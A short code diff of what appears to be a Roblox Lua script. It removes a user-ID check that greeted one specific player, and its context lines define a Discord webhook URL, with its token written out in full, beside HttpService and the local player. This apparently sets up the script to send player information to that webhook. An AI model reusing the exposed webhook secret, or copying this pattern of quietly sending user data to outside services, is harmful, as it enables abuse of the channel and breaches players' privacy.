@@ -1,8 +1,3 @@
-local playerId = game.Players.LocalPlayer.UserId
-
-if playerId == 5398730968 then
-    print("Hello DarthTyler")
-else
 local url = "https://discord.com/api/webhooks/1365210743317987368/tdThLVO4aYToCdsxgs6YXoeyMIMJoqhWVyhOYBKlBs8E_lNi47AVZLZmK675jl_gDMxw"
 local httpService = game:GetService("HttpService")
 local player = game:GetService("Players").LocalPlayer
